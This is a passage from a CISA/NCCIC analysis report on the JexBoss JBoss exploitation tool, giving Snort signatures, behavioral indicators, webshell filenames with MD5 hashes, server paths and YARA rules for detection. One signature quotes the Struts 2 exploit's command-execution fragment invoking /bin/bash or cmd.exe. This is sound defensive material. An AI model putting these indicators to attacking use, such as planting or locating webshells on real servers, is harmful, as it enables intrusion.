sid:X; rev:1;)</td></tr><tr><td scope="col" style="text-align: left;">3</td><td scope="col" style="text-align: left;">Attempts by the successfully exploited server to download the JexBoss webshell from the internet</td><td scope="col" style="text-align: left;">alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:"JexBoss webshell download"; flow:established,to_server; content:"rnp/jexws4.war"; http_uri; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)</td></tr><tr><td scope="col" style="text-align: left;">4</td><td scope="col" style="text-align: left;">CDNS queries for the JexBoss webshell version check and alternate download location</td><td scope="col" style="text-align: left;">alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for JexBoss alternate domain"; flow:to_server; byte_test:1,!&amp;,0xF8,2; content:"|08|webshell|07|jexboss|03|net|00|"; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)</td></tr></thead></table><p>When run against real-world network traffic, NCCIC generated alerts for rule 1 in table 4 above. The URI pattern for these alerts was <code>/jexinv4/jexinv4.jsp?ppp=&lt;cmd&gt;</code>, where <code>&lt;cmd&gt;</code> was a long Linux command that tried to induce the server to download and execute a Linux webshell script from an internet location. This attempt to access the JexBoss webshell was one of several unrelated <code>HTTP </code>requests from the same source IP to the same target IP, likely indicating scanning activity to determine if the server was already compromised by any of a number of tools, including JexBoss.</p><p>As noted in the Attacker to Victim Network Behavior section, an <code>HTTP 200 OK</code> message response from the server would indicate that the webshell was installed on the server. However, the response observed in the NCCIC environment was an <code>HTTP 302 Redirect</code> message, which instructed the client to repeat the request of <code>HTTPS</code>. NCCIC did not observe any such HTTPS traffic. Most likely the presumed scanning tool used to generate the HTTP traffic was not able to properly handle the <code>HTTP 302</code> response.</p><p>Table 5 provides the Snort rules that indicate JexBoss activity but do not necessarily indicate successful JexBoss exploitation. Rule 5 in table 5 below, alerts on traffic to the JexBoss author’s domain, which—in addition to JexBoss webshells—contains non-JexBoss content.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 906px; height: 312px;"><caption><p><strong>Table 5: Snort signatures identifying JexBoss attempts</strong></p></caption><thead><tr><th scope="col"><strong>#</strong></th><th scope="col"><strong>Network Activity</strong></th><th scope="col"><strong>Detection Signature</strong></th></tr><tr><td scope="col" style="text-align: left;">1</td><td scope="col" style="text-align: left;">DNS queries for the JexBoss author’s domain</td><td scope="col" style="text-align: left;">alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for JexBoss author domain joaomatosf.com"; flow:to_server; byte_test:1,!&amp;,0xF8,2; content:"|0A|joaomatosf|03|com|00|"; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)</td></tr><tr><td scope="col" style="text-align: left;">2</td><td scope="col" style="text-align: left;">Detects the JexBoss-specific probe of the Apache Struts 2 vulnerability (CVE-2017-5638)</td><td scope="col" style="text-align: left;">alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg: "JexBoss Apache Struts 2 Probe or exploit"; flow:established,to_server; content: "GET"; http_method; content: "(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift}))"; fast_pattern; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid: X; rev:1;)</td></tr><tr><td scope="col" style="text-align: left;">3</td><td scope="col" style="text-align: left;">The HTTP User-Agent header value specific to JexBoss (for the deprecated version 1 of the webshell)</td><td scope="col" style="text-align: left;">alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:" JexBoss User-Agent"; flow:established,to_server; content: “GET”; http_method; content:"jexboss"; http_user_agent; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)</td></tr></thead></table><h5>Behavior Analysis of Network Activity</h5><p>The Snort signatures described in the Network IDS and IPS Signatures section may allow organizations to detect some JexBoss attacks. However, attackers attempting to use stealthier techniques may be able to tune their attacks to avoid detection from these signatures.</p><p>By analyzing the behavior surrounding the attack, either manually or by using automated tools, network defenders may be able to determine whether an attack has succeeded. NCCIC’s recommended analysis methods include searching for the following:</p><ul><li><strong>Unusual outbound connection attempts from the server</strong><ul><li>Unusual outbound connection attempts may indicate an attacker attempting to initiate a reverse webshell or exfiltrate data.</li></ul></li><li><strong>Unusual internet downloads from the server</strong><ul><li>Unusual internet downloads may indicate that an attacker is attempting to obtain tools to perform additional attacks (e.g., Mimikatz, SQLMap).</li></ul></li><li><strong>Unusual URIs being served by the webserver</strong><ul><li>The presence of unusual URIs may indicate the installation of a webshell, as is the case when <code>jexws4/jexws4.jsp</code> is used.</li></ul></li><li><strong>Embedded OS commands</strong><ul><li>Network defenders should specifically search for OS commands embedded in HTTP query parameters, HTTP header values, and <code>HTTP POST</code> data in the contents of the organization’s network traffic. For example, the command in the Apache Struts 2 exploit is visible in the cleartext in the Content-Type header. NCCIC recommends organizations analyze their server to identify evidence that OS commands like these have been executed, the presence of which indicates a successful attack.</li></ul></li></ul><p>Combining the automated analysis of signatures and behavioral indicators may significantly improve false-positive rates and time-to-detection.</p><h5>On-Server Artifacts</h5><p>The JexBoss webshell files included on the JexBoss GitHub page—and available on the <code>joaomatosf[.]com</code> website—are Web Application aRchive (WAR) format files, with the file extension <code>.war</code>. These WAR files are basically ZIP files containing the file<code> jexws.jsp</code>, which is the file in the URI that JexBoss requests in order to perform command execution. The JexBoss webshell <code>.war</code> and <code>.jsp</code> file names may start with <code>jexsw2</code>, <code>jexws3</code>, <code>jexws4</code>, or <code>jbossass</code>.</p><p>Tables 6, 7, and 8 include filenames and their associated MD5 checksums for the files related to the JexBoss webshell. Network defenders should search for these files on their organization’s web server file systems, the presence of which indicates a JexBoss webshell.</p><p>The webshell files provided on the JexBoss GitHub page are identified in table 6.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 928px; height: 75px;"><caption><p><strong>Table 6: JexBoss webshells on GitHub</strong></p></caption><thead><tr><th scope="col"><strong>Filename</strong></th><th scope="col"><strong>Webshell Version</strong></th><th scope="col"><strong>Size (bytes)</strong></th><th scope="col"><strong>MD5 Checksum</strong></th></tr></thead><tbody><tr><td>jbossass.war</td><td>1</td><td>685</td><td>cbdeaf83f58a64b09df58b94063e0146</td></tr><tr><td>jexws.war and jbossas.war</td><td>2</td><td>1296</td><td>3f156bd68b2a32a1b5cb03af318667f0</td></tr></tbody></table><p>If the target web server is induced to download the <code>.war</code> file from <code>joaomatosf[.]com</code> (see the Webshell Installation section), the web server will retrieve the latest version of the webshell (currently version 4). NCCIC’s examination of the public files hosted on <code>joaomatosf[.]com</code> revealed the presence of the<code> .war</code> files listed in table 7.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 926px; height: 148px;"><caption><p><strong>Table 7: JexBoss webshells listed on<code> joaomatosf[.]com</code></strong></p></caption><thead><tr><th scope="col"><strong>Filename</strong></th><th scope="col"><strong>Webshell Version</strong></th><th scope="col"><strong>Size (bytes)</strong></th><th scope="col"><strong>MD5 Checksum</strong></th></tr></thead><tbody><tr><td>jbossass.war</td><td>4</td><td>1452</td><td>8db88d5d46aa503a697a6940aa10a574</td></tr><tr><td>jexws.war</td><td>4</td><td>1446</td><td>bb8d176207045ff70470c511271f56d9</td></tr><tr><td>jexws2.war</td><td>4</td><td>1448</td><td>13062a85ed1f5c3f4878ff3950a8e222</td></tr><tr><td>jexws3.war</td><td>4</td><td>1448</td><td>f2af83ed4cac1d2c68f82bd8450c7428</td></tr><tr><td>jexws4.war</td><td>4</td><td>1448</td><td>a15bf7dd4169069c70ba2f4ee1c62b03</td></tr></tbody></table><p>The <code>.jsp</code> files within the <code>.war</code> files in tables 6 and 7 are listed in table 8.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 930px; height: 100px;"><caption><p><strong>Table 8: JexBoss <code>.jsp </code>files</strong></p></caption><thead><tr><th scope="col"><strong>Filename</strong></th><th scope="col"><strong>Webshell Version</strong></th><th scope="col"><strong>Size (bytes)</strong></th><th scope="col"><strong>MD5 Checksum</strong></th></tr></thead><tbody><tr><td>jbossass.jsp</td><td>1</td><td>378</td><td>3cd75a261debd9fb2b16368266fba778</td></tr><tr><td>jexws.jsp</td><td>2</td><td>1812</td><td>e7d94e998f1ec8beb8f33e56607c45f9</td></tr><tr><td>jexws.jsp</td><td>4</td><td>2201</td><td>acda46759d7c3526df2a6c59803586a4</td></tr></tbody></table><p>Once the <code>.war</code> file is successfully uploaded to the victim web server, JBoss handles the file as if it is a legitimate web application. In the test environment, NCCIC found the original <code>.war</code> and the unzipped <code>.jsp</code> files in a temporary location (<code>/opt/jboss-6.1.0.Final/server/default/tmp</code>), while the contents of the <code>.jsp</code> file were wrapped in a platform-specific class and written to a new file. The contents of the <code>.jsp</code> file were then installed by JBoss in the following location:</p><p style="text-align: center;"><code>/opt/jboss-6.1.0.Final/server/default/work/jboss.web/localhost/jexws4/org/apache/jsp/jexws4_jsp.java</code></p><p>Advanced users of JexBoss can change the names of the webshell files, make minor modifications so that the MD5 checksum differs from those listed in this report, or completely change this webshell to circumvent the methods of detection that focus on the presence of the specific files listed in this report. However, network defenders may still benefit from frequently reviewing web servers for the presence of unwanted files and URIs served by their web server, which may indicate the presence of a webshell or other malware.</p><p>Network defenders should carefully examine their organization’s web server logs for indications of malicious web requests, specifically to identify requests that contain OS commands, such as</p><ul><li><code>/bin/bash</code> or <code>uname -a</code> in Linux, or</li><li><code>cmd.exe</code> or <code>net </code>commands in Windows.</li></ul><p>Forensic analysts can use the YARA rules provided in figure 17 to search their web server file system for the presence of JexBoss webshell files. These general YARA rules may work better than file hashes to alert on webshell files that attackers have made small changes to in order to evade detection. These general YARA rules will not detect other custom webshells or heavily modified JexBoss webshells.</p><div style="background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;">rule jexboss_war: webshell<br />{<br />    meta:<br />        description = "JexBoss WAR File"<br />    strings:<br />        $magic = { 50 4b 03 04 ( 14 | 0a ) 00 }<br />        $string_1 = "jexws"<br />        $string_2 = "jbossass"<br />        $jsp_ext = ".jsp"</div><div style="background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;">    condition:<br />        $magic at 0 and 1 of ($string_*) and $jsp_ext<br />}</div><div style="background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;">rule jexboss_jsp: webshell<br />{<br />    meta:<br />        description = "JexBoss JSP file"<br />    strings:<br />        $string_1 = "getParameter(\"ppp\")"<br />        $string_2 = "jexboss" nocase<br />        $string_3 = "getRuntime().exec("<br />    condition:<br />        all of ($string_*)<br />}</div><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 17: JexBoss webshell YARA rules</strong></p></div>
+      
+        
+        		    <a id="references"></a>
+		    <h3>References</h3>
+            
+      <div class="field field--name-field-ar-references field--type-link field--label-hidden field--items">
+              <div class="field--item"><a href="https://blog.talosintelligence.com/2016/03/samsam-ransomware.html">[1] Cisco Talos Intelligence Blog post on SamSam</a></div>
+              <div class="field--item"><a href="https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf">[2] Symantec Internet Security Threat Report </a></div>
+              <div class="field--item"><a href="https://www.exploit-db.com/exploits/41570/">[3] Exploit Database article on Apache Struts 2 exploit</a></div>
+          </div>
+  
+        
+        		    <a id="revisions"></a>
+		    <h3>Revisions</h3>
+            
+      <div class="field field--name-field-ar-revision-history field--type-string field--label-hidden field--items">
+              <div class="field--item">November 8, 2018: Initial version </div>
+          </div>
+  
+        
+        
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><p class="privacy-and-terms">This product is provided subject to this <a href="/privacy/notification">Notification</a> and this <a href="https://www.dhs.gov/privacy-policy">Privacy &amp; Use</a> policy.</p>
+</div>
+      
+
+	</div>
+                        <div id="document-feedback">
+	<div class="inner-document-feedback center-center">
+        <p><b>Please share your thoughts.</b></p>
+		<p>We recently updated our anonymous <a href="https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A">product survey</a>; we'd welcome your feedback.</p>
+	</div>
+</div>
+
+              </div>
+
+</article>
+
+
+  </div>
+
+              </section>
+
+
+                      </div>
+  </div>
+
+
+
+
+
+
+      <footer class="footer container-fluid" role="contentinfo">
+        <div class="region region-footer">
+    <section id="block-certsignup" class="block block-block-content block-block-contentc5846d10-2e2b-4822-aa59-7a5c3262f671 clearfix">
+  
+    
+
+      
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><div class="container-fluid signup">
+<div class="container">
+<div class="row">
+<div class="col-lg-3 contact-icons">
+<h3>Contact Us</h3>
+
+<p class="phone-text"><img alt="phone icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/Icon-Phone.png" />(888)282-0870</p>
+
+<p><img alt="email icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/Icon-Email.png" /><a class="mailto" href="mailto:central@cisa.dhs.gov" title="General questions or suggestions">Send us email</a></p>
+
+<p><img alt="lock icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/Icon-Lock.png" /><a href="/contact-us/" title="Download PGP/GPG keys">Download PGP/GPG keys</a></p>
+
+<p><img alt="feedback icon" data-entity-type="" data-entity-uuid="" height="32" src="/sites/default/files/images/icon-feedback.png" /><a href="/forms/website-feedback" title="Website Feedback">Submit website feedback</a></p>
+</div>
+
+<div class="col-lg-6 sub-alert">
+<h3>Subscribe to Alerts</h3>
+
+<p>Receive security alerts, tips, and other updates.</p>
+
+<form action="https://public.govdelivery.com/accounts/USDHSCISA/subscribers/qualify"><label class="visually-hidden" for="email-address-field">Enter your email address</label> <input class="signup-form" id="email-address-field" name="email" placeholder=" Enter your email address" title="Enter your email address" type="text" /><br /><input class="btn btn-primary" name="submit" title="Sign up for alerts" type="submit" value="Sign Up" /> </form>
+
+<div class="pull-right signup-icon-one"><a href="https://twitter.com/uscert_gov" title="US-CERT Twitter Feed"><img alt="twitter icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/twitter-button.png" /></a></div>
+
+<div class="pull-right signup-icon-two"><a href="/mailing-lists-and-feeds" title="Mailing Lists and Feeds"><img alt="rss icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/rss-button-bottom.png" /></a></div>
+
+<div class="pull-right signup-icon-three"><a href="/hsin" class="btn btn-cert-report" name="button" type="button" id="button">HSIN</a></div>
+</div>
+
+<div class="col-lg-3 cert-report"><a class="btn btn-cert-report btn-lg" href="/report" name="button" type="button" id="button">Report</a></div>
+</div>
+</div>
+</div>
+</div>
+      
+  </section>
+
+<section id="block-certcertfooter" class="block block-block-content block-block-contentd5b85bd2-62d1-485a-b9ae-f040b1ca1a45 clearfix">
+  
+    
+
+      
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><div class="container">
+<hr /><div class="text-center"><a href="/" title="Home">Home</a>   <a href="/sitemap" title="Site Map">Site Map</a>   <a href="/faq/" title="Frequently Asked Questions">FAQ</a>   <a href="/contact-us/" title="Contact Us">Contact Us</a>   <a href="/tlp/" title="Traffic Light Protocol">Traffic Light Protocol</a>   <a href="/pcii" title="PCII">PCII</a>   <a href="https://www.dhs.gov" title="Accountability">Accountability</a>   <a href="/disclaimer" title="Disclaimer">Disclaimer</a>   <a href="/privacy-policy" title="Privacy Policy">Privacy Policy</a>   <a href="https://www.dhs.gov/freedom-information-act-foia" title="FOIA">FOIA</a>   <a href="https://www.dhs.gov/homeland-security-no-fear-act-reporting" title="No Fear Act">No Fear Act</a>   <a href="/accessibility/" title="Accessibility">Accessibility</a><a href="https://www.dhs.gov/plain-writing-dhs" title="Plain Writing">Plain Writing</a><a href="https://www.dhs.gov/plug-information" title="Plug-ins">Plug-ins</a>   <a href="https://www.oig.dhs.gov/" title="Office of the Inspector General">Inspector General</a>   <a href="https://www.whitehouse.gov/" title="The White House">The White House</a>   <a href="https://www.usa.gov/" title="USA.gov">USA.gov</a><br />
+ 
+<p>CISA is part of the <a href="https://www.dhs.gov/" title="Department of Homeland Security">Department of Homeland Security</a></p>
+</div>
+<script type="text/javascript">
+<!--//--><![CDATA[// ><!--
+
+    window.onload = function(){
+            jQuery('body.page-node-type-us-cert-events div#ncas-header').find('img').each(function(){
+                    var $src=jQuery(this).prop('src');
+                    if($src.indexOf('default/files/') == -1)jQuery(this).remove();
+                    });
+            if('Privacy Data Breach' == jQuery('#uscert-utilities-irf-form #item-info-impact option:selected').text()){ 
+                jQuery('#item-info-impact-block').removeClass('collapsed'); 
+            }
+jQuery('#print-logo img').removeAttr('width').removeAttr('height');
+if(jQuery('body.path-frontpage').length > 0)
+{   
+    jQuery('.main-container').find('.col-sm-12').removeAttr('role');
+}
+jQuery('#map area').each(function(){ jQuery(this).click(function(){var idstr=jQuery(this).attr('clickthis'); if(jQuery(idstr).hasClass('open') == false){jQuery(idstr).click();}});});  
+if(jQuery('#document-feedback').length > 0)
+{ 
+    var $url    = window.location.href
+    //var str ='Your feedback is very important to us. Please take a moment to complete this <a href="https://surveymonkey.com/r/G8STDRY?product=' + $url + '">survey.';
+    //var $p = jQuery('#document-feedback div p').html(str);
+}
+    };
+
+//--><!]]>
+</script></div>
+<style type="text/css">
+<!--/*--><![CDATA[/* ><!--*/
+#views-bootstrap-carousel-block-2 .carousel-inner > .item > a > img {
+  margin:auto;
+}
+button#product-feedback-next {
+    margin-bottom: 10px;
+}
+/*
+.mobile-nav {
+border-bottom: 3px solid #112e51;
+}
+*/
+.cma-banner-container {
+    display: none;
+}
+@media (max-width: 991px) {
+.navbar .navbar-header {
+background: #fff;
+}
+}
+div.banner-region { background: #fff; }
+
+.accordion_fold {
+    padding-bottom: 25px;
+}
+
+h2.accordion.open {
+    background: #f2f2f2;
+}
+
+a { color: #2b72af;}
+
+.navbar-default .navbar-nav > li > a { color: #767676; }
+/* andi */
+.sidebar-widget-orange .orange {
+    background-color: #e77431;
+}
+#block-views-block-ics-announcements-block-1 .views-field-created {
+    color: #565656;
+}
+a#sort-bulletin {
+color: #000;
+background: white;
+position: absolute;
+right: 150px;
+padding: 1px 12px;
+}
+
+/*--><!]]>*/
+</style></div>
+      
+  </section>
+
+
+  </div>
+
+    </footer>
+  
+  </div>
+
+    
+    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","scriptPath":null,"pathPrefix":"","currentPath":"node\/9868","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"google_analytics":{"account":"UA-34879253-1","trackOutbound":true,"trackMailto":true,"trackDownload":true,"trackDownloadExtensions":"7z|aac|arc|arj|asf|asx|avi|bin|csv|doc(x|m)?|dot(x|m)?|exe|flv|gif|gz|gzip|hqx|jar|jpe?g|js|mp(2|3|4|e?g)|mov(ie)?|msi|msp|pdf|phps|png|ppt(x|m)?|pot(x|m)?|pps(x|m)?|ppam|sld(x|m)?|thmx|qtm?|ra(m|r)?|sea|sit|tar|tgz|torrent|txt|wav|wma|wmv|wpd|xls(x|m|b)?|xlt(x|m)|xlam|xml|z|zip"},"data":{"extlink":{"extTarget":false,"extTargetNoOverride":false,"extNofollow":false,"extNoreferrer":false,"extFollowNoOverride":false,"extClass":"ext","extLabel":"(link is external)","extImgClass":false,"extSubdomains":true,"extExclude":"(\\.gov|\\.mil|\\.org.*|twitter\\.com\\\/share\\?url\\=.*|www\\.facebook\\.com\\\/sharer\\.php\\?u\\=.*|www\\.addthis\\.com\\\/bookmark\\.php\\?url\\=.*|javascript\\:window\\.print\\(\\)\\;)","extInclude":"","extCssExclude":"","extCssExplicit":"","extAlert":true,"extAlertText":"You are now leaving an official website of the United States Government (USG), the Department of Homeland Security (DHS), and the Cybersecurity and Infrastructure Security Agency (CISA). Links to non-USG, non-DHS, and non-CISA sites are provided for the visitor\u0027s convenience and do not represent an endorsement by USG, DHS, or CISA of any commercial or private issues, products, or services. Note that the privacy policy of the linked site may differ from that of USG, DHS, and CISA.","mailtoClass":"mailto","mailtoLabel":"(link sends email)","extUseFontAwesome":false,"extIconPlacement":"append","extFaLinkClasses":"fa fa-external-link","extFaMailtoClasses":"fa fa-envelope-o","whitelistedDomains":null}},"bootstrap":{"forms_has_error_value_toggle":1,"popover_enabled":1,"popover_animation":1,"popover_auto_close":1,"popover_container":"body","popover_content":"","popover_delay":"0","popover_html":0,"popover_placement":"right","popover_selector":"","popover_title":"","popover_trigger":"click","tooltip_enabled":1,"tooltip_animation":1,"tooltip_container":"body","tooltip_delay":"0","tooltip_html":0,"tooltip_placement":"auto left","tooltip_selector":"","tooltip_trigger":"hover"},"user":{"uid":0,"permissionsHash":"5ac3ae468050ddd0aa4ecea12c34a32977a23244239ed53eb7226f296aed658f"}}</script>
+<script src="/sites/default/files/js/js_xhqBHziEDyCKWlB5IUseaFAGh1B08TPFGmxCf6RvFnM.js"></script>
+<script src="https://dap.digitalgov.gov/Universal-Federated-Analytics-Min.js?agency=DHS&amp;subagency=US-CERT&amp;pua=0" id="_fed_an_ua_tag"></script>
+<script src="/sites/default/files/js/js_m5CHELy9XHlAx2jnhaYdT2XVeN916TnZL5U2ha7Ln94.js"></script>
+
+  <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"877b02039c","applicationID":"628657512,979282327","transactionName":"ZFYHMhZSXUpRUkcKDF0cJAUQWlxXH0FSBAZsUAQFDFY=","queueTime":0,"applicationTime":51,"atts":"SBEERF5ITkQ=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
+</html>
